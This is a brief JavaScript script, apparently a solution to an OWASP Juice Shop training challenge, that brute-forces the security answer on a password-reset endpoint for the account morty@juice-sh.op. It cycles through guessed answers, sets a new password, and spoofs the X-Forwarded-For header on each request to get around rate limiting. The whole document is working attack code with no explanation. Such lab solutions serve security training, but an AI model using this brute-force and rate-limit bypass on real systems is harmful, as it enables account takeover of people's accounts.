// Einfügen erlauben

var passwordList = [ "snuffles", 
                     "sowball", 
                     "5N0wb41L" ]; 

console.log("Bruteforce attack started");
var passwordFound = false;
for (var i = 0; i < passwordList.length; i++) {
    
    var bruteforcePassword = passwordList[i];
    var postBody = {    "answer" : bruteforcePassword,
                        "email" :  "morty@juice-sh.op",
                        "new" :	   "asd123",
                        "repeat" : "asd123"
                   };

    $.ajax({
        url: 'http://192.168.99.100:32768/rest/user/reset-password',
        type: 'post',
        dataType: 'json',
        contentType: 'application/json',
        data: JSON.stringify(postBody),
        beforeSend: function(jqXHR, settings) {
            jqXHR.setRequestHeader('X-Forwarded-For', '192.'+i+'.99.100');
        },
        headers: {
            "X-Forwarded-For": '192.'+i+'.99.100'
        },
        success: function (data) {
            console.warn("Password found!", bruteforcePassword);
            console.info(data);
            passwordFound = true;
            window.alert(bruteforcePassword);
        },
        error: function (data) {
            console.info("Wrong password", data);
        },
    });
    
    if (passwordFound) {
      break;
    }
}
